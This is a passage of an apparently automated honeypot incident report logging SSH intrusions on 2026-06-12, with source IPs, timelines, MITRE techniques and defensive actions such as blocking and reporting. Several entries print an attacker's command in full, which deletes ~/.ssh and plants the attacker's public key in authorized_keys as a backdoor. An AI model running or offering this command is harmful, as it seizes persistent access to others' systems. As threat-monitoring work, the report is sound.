### 🔴 HIGH · IR-d5d5d8ba4bf9

| Field | Detail |
|---|---|
| **Source IP** | `188.244.115[.]211` |
| **First Seen** | 2026-06-12 06:24 |
| **Last Seen** | 2026-06-12 06:24 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 06:24:43` | `cowrie.session.connect` |
| `2026-06-12 06:24:43` | `cowrie.client.version` |
| `2026-06-12 06:24:43` | `cowrie.client.kex` |
| `2026-06-12 06:24:44` | `cowrie.login.success` |
| `2026-06-12 06:24:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `188.244.115[.]211` to AbuseIPDB if not already reported
- [ ] Block `188.244.115[.]211` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dd2f76d99f06

| Field | Detail |
|---|---|
| **Source IP** | `218.248.19[.]102` |
| **First Seen** | 2026-06-12 07:31 |
| **Last Seen** | 2026-06-12 07:31 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 07:31:14` | `cowrie.session.connect` |
| `2026-06-12 07:31:15` | `cowrie.client.version` |
| `2026-06-12 07:31:15` | `cowrie.client.kex` |
| `2026-06-12 07:31:16` | `cowrie.login.success` |
| `2026-06-12 07:31:16` | `cowrie.direct-tcpip.request` |
| `2026-06-12 07:31:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `218.248.19[.]102` to AbuseIPDB if not already reported
- [ ] Block `218.248.19[.]102` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c204087f6afd

| Field | Detail |
|---|---|
| **Source IP** | `107.150.105[.]116` |
| **First Seen** | 2026-06-12 07:31 |
| **Last Seen** | 2026-06-12 07:31 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 07:31:45` | `cowrie.session.connect` |
| `2026-06-12 07:31:45` | `cowrie.client.version` |
| `2026-06-12 07:31:45` | `cowrie.client.kex` |
| `2026-06-12 07:31:46` | `cowrie.login.success` |
| `2026-06-12 07:31:47` | `cowrie.session.params` |
| `2026-06-12 07:31:47` | `cowrie.command.input` |
| `2026-06-12 07:31:47` | `cowrie.command.failed` |
| `2026-06-12 07:31:47` | `cowrie.log.closed` |
| `2026-06-12 07:31:48` | `cowrie.session.params` |
| `2026-06-12 07:31:48` | `cowrie.command.input` |
| `2026-06-12 07:31:48` | `cowrie.session.file_download` |
| `2026-06-12 07:31:48` | `cowrie.log.closed` |
| `2026-06-12 07:31:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `107.150.105[.]116` to AbuseIPDB if not already reported
- [ ] Block `107.150.105[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9a76d2c8efd6

| Field | Detail |
|---|---|
| **Source IP** | `107.150.105[.]116` |
| **First Seen** | 2026-06-12 07:31 |
| **Last Seen** | 2026-06-12 07:31 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 07:31:51` | `cowrie.session.connect` |
| `2026-06-12 07:31:51` | `cowrie.client.version` |
| `2026-06-12 07:31:51` | `cowrie.client.kex` |
| `2026-06-12 07:31:52` | `cowrie.login.success` |
| `2026-06-12 07:31:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `107.150.105[.]116` to AbuseIPDB if not already reported
- [ ] Block `107.150.105[.]116` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4e00bc856b5c

| Field | Detail |
|---|---|
| **Source IP** | `103.76.120[.]198` |
| **First Seen** | 2026-06-12 07:39 |
| **Last Seen** | 2026-06-12 07:39 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 07:39:44` | `cowrie.session.connect` |
| `2026-06-12 07:39:44` | `cowrie.client.version` |
| `2026-06-12 07:39:44` | `cowrie.client.kex` |
| `2026-06-12 07:39:45` | `cowrie.login.success` |
| `2026-06-12 07:39:46` | `cowrie.session.params` |
| `2026-06-12 07:39:46` | `cowrie.command.input` |
| `2026-06-12 07:39:46` | `cowrie.command.failed` |
| `2026-06-12 07:39:46` | `cowrie.log.closed` |
| `2026-06-12 07:39:46` | `cowrie.session.params` |
| `2026-06-12 07:39:46` | `cowrie.command.input` |
| `2026-06-12 07:39:46` | `cowrie.session.file_download` |
| `2026-06-12 07:39:46` | `cowrie.log.closed` |
| `2026-06-12 07:39:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.76.120[.]198` to AbuseIPDB if not already reported
- [ ] Block `103.76.120[.]198` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-60dc364b3e64

| Field | Detail |
|---|---|
| **Source IP** | `103.76.120[.]198` |
| **First Seen** | 2026-06-12 07:39 |
| **Last Seen** | 2026-06-12 07:39 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 07:39:49` | `cowrie.session.connect` |
| `2026-06-12 07:39:49` | `cowrie.client.version` |
| `2026-06-12 07:39:49` | `cowrie.client.kex` |
| `2026-06-12 07:39:50` | `cowrie.login.success` |
| `2026-06-12 07:39:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.76.120[.]198` to AbuseIPDB if not already reported
- [ ] Block `103.76.120[.]198` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ba89c58b920c

| Field | Detail |
|---|---|
| **Source IP** | `103.30.40[.]129` |
| **First Seen** | 2026-06-12 07:41 |
| **Last Seen** | 2026-06-12 07:41 |
| **Session Duration** | 42s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 07:41:01` | `cowrie.session.connect` |
| `2026-06-12 07:41:01` | `cowrie.client.version` |
| `2026-06-12 07:41:01` | `cowrie.client.kex` |
| `2026-06-12 07:41:02` | `cowrie.login.success` |
| `2026-06-12 07:41:02` | `cowrie.session.params` |
| `2026-06-12 07:41:02` | `cowrie.command.input` |
| `2026-06-12 07:41:02` | `cowrie.command.failed` |
| `2026-06-12 07:41:02` | `cowrie.log.closed` |
| `2026-06-12 07:41:02` | `cowrie.session.params` |
| `2026-06-12 07:41:02` | `cowrie.command.input` |
| `2026-06-12 07:41:02` | `cowrie.session.file_download` |
| `2026-06-12 07:41:02` | `cowrie.log.closed` |
| `2026-06-12 07:41:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.30.40[.]129` to AbuseIPDB if not already reported
- [ ] Block `103.30.40[.]129` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b063f5a11696

| Field | Detail |
|---|---|
| **Source IP** | `178.176.224[.]83` |
| **First Seen** | 2026-06-12 07:41 |
| **Last Seen** | 2026-06-12 07:41 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 07:41:15` | `cowrie.session.connect` |
| `2026-06-12 07:41:15` | `cowrie.client.version` |
| `2026-06-12 07:41:15` | `cowrie.client.kex` |
| `2026-06-12 07:41:16` | `cowrie.login.success` |
| `2026-06-12 07:41:17` | `cowrie.session.params` |
| `2026-06-12 07:41:17` | `cowrie.command.input` |
| `2026-06-12 07:41:17` | `cowrie.command.failed` |
| `2026-06-12 07:41:17` | `cowrie.log.closed` |
| `2026-06-12 07:41:17` | `cowrie.session.params` |
| `2026-06-12 07:41:17` | `cowrie.command.input` |
| `2026-06-12 07:41:17` | `cowrie.session.file_download` |
| `2026-06-12 07:41:17` | `cowrie.log.closed` |
| `2026-06-12 07:41:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.176.224[.]83` to AbuseIPDB if not already reported
- [ ] Block `178.176.224[.]83` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e8ed5b7295d8

| Field | Detail |
|---|---|
| **Source IP** | `178.176.224[.]83` |
| **First Seen** | 2026-06-12 07:41 |
| **Last Seen** | 2026-06-12 07:41 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 07:41:20` | `cowrie.session.connect` |
| `2026-06-12 07:41:20` | `cowrie.client.version` |
| `2026-06-12 07:41:20` | `cowrie.client.kex` |
| `2026-06-12 07:41:20` | `cowrie.login.success` |
| `2026-06-12 07:41:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.176.224[.]83` to AbuseIPDB if not already reported
- [ ] Block `178.176.224[.]83` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6b8e23cc6f0a

| Field | Detail |
|---|---|
| **Source IP** | `49.124.151[.]52` |
| **First Seen** | 2026-06-12 07:57 |
| **Last Seen** | 2026-06-12 07:57 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 07:57:11` | `cowrie.session.connect` |
| `2026-06-12 07:57:11` | `cowrie.client.version` |
| `2026-06-12 07:57:11` | `cowrie.client.kex` |
| `2026-06-12 07:57:13` | `cowrie.login.success` |
| `2026-06-12 07:57:13` | `cowrie.direct-tcpip.request` |
| `2026-06-12 07:57:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.124.151[.]52` to AbuseIPDB if not already reported
- [ ] Block `49.124.151[.]52` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e52b60a2bc47

| Field | Detail |
|---|---|
| **Source IP** | `106.12.108[.]64` |
| **First Seen** | 2026-06-12 08:05 |
| **Last Seen** | 2026-06-12 08:06 |
| **Session Duration** | 40s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 08:05:38` | `cowrie.session.connect` |
| `2026-06-12 08:05:40` | `cowrie.client.version` |
| `2026-06-12 08:05:41` | `cowrie.client.kex` |
| `2026-06-12 08:05:42` | `cowrie.login.success` |
| `2026-06-12 08:05:43` | `cowrie.session.params` |
| `2026-06-12 08:05:43` | `cowrie.command.input` |
| `2026-06-12 08:05:43` | `cowrie.command.failed` |
| `2026-06-12 08:05:44` | `cowrie.log.closed` |
| `2026-06-12 08:06:18` | `cowrie.session.params` |
| `2026-06-12 08:06:18` | `cowrie.command.input` |
| `2026-06-12 08:06:18` | `cowrie.session.file_download` |
| `2026-06-12 08:06:18` | `cowrie.log.closed` |
| `2026-06-12 08:06:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `106.12.108[.]64` to AbuseIPDB if not already reported
- [ ] Block `106.12.108[.]64` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d3346a549a8f

| Field | Detail |
|---|---|
| **Source IP** | `8.137.111[.]249` |
| **First Seen** | 2026-06-12 09:07 |
| **Last Seen** | 2026-06-12 09:07 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 09:07:49` | `cowrie.session.connect` |
| `2026-06-12 09:07:49` | `cowrie.client.version` |
| `2026-06-12 09:07:49` | `cowrie.client.kex` |
| `2026-06-12 09:07:50` | `cowrie.login.success` |
| `2026-06-12 09:07:50` | `cowrie.session.params` |
| `2026-06-12 09:07:50` | `cowrie.command.input` |
| `2026-06-12 09:07:50` | `cowrie.command.failed` |
| `2026-06-12 09:07:50` | `cowrie.log.closed` |
| `2026-06-12 09:07:51` | `cowrie.session.params` |
| `2026-06-12 09:07:51` | `cowrie.command.input` |
| `2026-06-12 09:07:51` | `cowrie.session.file_download` |
| `2026-06-12 09:07:51` | `cowrie.log.closed` |
| `2026-06-12 09:07:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `8.137.111[.]249` to AbuseIPDB if not already reported
- [ ] Block `8.137.111[.]249` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0d7e72efb3e7

| Field | Detail |
|---|---|
| **Source IP** | `8.137.111[.]249` |
| **First Seen** | 2026-06-12 09:07 |
| **Last Seen** | 2026-06-12 09:07 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 09:07:53` | `cowrie.session.connect` |
| `2026-06-12 09:07:53` | `cowrie.client.version` |
| `2026-06-12 09:07:53` | `cowrie.client.kex` |
| `2026-06-12 09:07:53` | `cowrie.login.success` |
| `2026-06-12 09:07:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `8.137.111[.]249` to AbuseIPDB if not already reported
- [ ] Block `8.137.111[.]249` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7820e6066d76

| Field | Detail |
|---|---|
| **Source IP** | `102.220.87[.]78` |
| **First Seen** | 2026-06-12 09:21 |
| **Last Seen** | 2026-06-12 09:21 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 09:21:26` | `cowrie.session.connect` |
| `2026-06-12 09:21:26` | `cowrie.client.version` |
| `2026-06-12 09:21:26` | `cowrie.client.kex` |
| `2026-06-12 09:21:27` | `cowrie.login.success` |
| `2026-06-12 09:21:28` | `cowrie.session.params` |
| `2026-06-12 09:21:28` | `cowrie.command.input` |
| `2026-06-12 09:21:28` | `cowrie.command.failed` |
| `2026-06-12 09:21:28` | `cowrie.log.closed` |
| `2026-06-12 09:21:28` | `cowrie.session.params` |
| `2026-06-12 09:21:28` | `cowrie.command.input` |
| `2026-06-12 09:21:29` | `cowrie.session.file_download` |
| `2026-06-12 09:21:29` | `cowrie.log.closed` |
| `2026-06-12 09:21:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.220.87[.]78` to AbuseIPDB if not already reported
- [ ] Block `102.220.87[.]78` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7404b6309259

| Field | Detail |
|---|---|
| **Source IP** | `102.220.87[.]78` |
| **First Seen** | 2026-06-12 09:21 |
| **Last Seen** | 2026-06-12 09:21 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 09:21:32` | `cowrie.session.connect` |
| `2026-06-12 09:21:32` | `cowrie.client.version` |
| `2026-06-12 09:21:32` | `cowrie.client.kex` |
| `2026-06-12 09:21:33` | `cowrie.login.success` |
| `2026-06-12 09:21:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.220.87[.]78` to AbuseIPDB if not already reported
- [ ] Block `102.220.87[.]78` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-29a92344c6ba

| Field | Detail |
|---|---|
| **Source IP** | `102.220.87[.]78` |
| **First Seen** | 2026-06-12 09:23 |
| **Last Seen** | 2026-06-12 09:23 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 09:23:46` | `cowrie.session.connect` |
| `2026-06-12 09:23:46` | `cowrie.client.version` |
| `2026-06-12 09:23:47` | `cowrie.client.kex` |
| `2026-06-12 09:23:48` | `cowrie.login.success` |
| `2026-06-12 09:23:48` | `cowrie.session.params` |
| `2026-06-12 09:23:48` | `cowrie.command.input` |
| `2026-06-12 09:23:48` | `cowrie.command.failed` |
| `2026-06-12 09:23:49` | `cowrie.log.closed` |
| `2026-06-12 09:23:49` | `cowrie.session.params` |
| `2026-06-12 09:23:49` | `cowrie.command.input` |
| `2026-06-12 09:23:50` | `cowrie.session.file_download` |
| `2026-06-12 09:23:50` | `cowrie.log.closed` |
| `2026-06-12 09:23:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.220.87[.]78` to AbuseIPDB if not already reported
- [ ] Block `102.220.87[.]78` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6db665836667

| Field | Detail |
|---|---|
| **Source IP** | `102.220.87[.]78` |
| **First Seen** | 2026-06-12 09:23 |
| **Last Seen** | 2026-06-12 09:23 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 09:23:53` | `cowrie.session.connect` |
| `2026-06-12 09:23:53` | `cowrie.client.version` |
| `2026-06-12 09:23:53` | `cowrie.client.kex` |
| `2026-06-12 09:23:54` | `cowrie.login.success` |
| `2026-06-12 09:23:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.220.87[.]78` to AbuseIPDB if not already reported
- [ ] Block `102.220.87[.]78` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-141b577b36b6

| Field | Detail |
|---|---|
| **Source IP** | `102.220.87[.]78` |
| **First Seen** | 2026-06-12 09:28 |
